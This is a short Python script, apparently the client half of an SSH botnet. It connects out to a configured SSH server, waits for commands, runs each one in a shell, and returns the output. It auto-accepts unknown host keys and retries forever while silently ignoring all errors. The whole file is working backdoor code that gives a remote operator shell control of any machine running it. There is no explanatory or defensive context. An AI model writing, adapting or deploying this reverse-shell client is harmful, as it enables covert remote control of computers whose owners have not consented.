import paramiko
import subprocess
import sys

#script args
server_address = '127.0.0.1'
server_port = 7688
username = "username"
password = "password"


#connect to the remote ssh server and recieve commands to be #executed and send back output
def ssh_command(server_address, server_port, username, password):
    #instantiate the ssh client
    client = paramiko.SSHClient()
#optional is using keys instead of password auth
    #client.load_host_key('/media/th3x0/101E13E1101E13E1/ssh_botnet/id_rsa.pub')
#auto add key
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())







    while True:
        try:
            #connect to ssh server
            client.connect(
                server_address,
                port=server_port,
                username=username,
                password=password
            )
            #get ssh session
            client_session = client.get_transport().open_session()
            if client_session.active and not client_session.closed:
                #wait for command, execute and send result ouput
                while True:
                    #use subprocess run with timeout of 30 seconds
                    try:
                        command = client_session.recv(1024).decode('utf-8')
                        command_output = subprocess.run(
                            command, stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            shell=True,
                            timeout=30
                        )
                        #send back the resulting output
                        if len(command_output.stderr.decode('utf-8')):
                            client_session.send(command_output.stderr.decode('utf-8'))
                        elif len(command_output.stdout.decode('utf-8')):
                            client_session.send(command_output.stdout.decode('utf-8'))
                        else:
                            client_session.send('null')
                    except subprocess.CalledProcessError as err:
                        client_session.send(str(err))
            client_session.close()
        except:
            pass


ssh_command(server_address, server_port, username, password)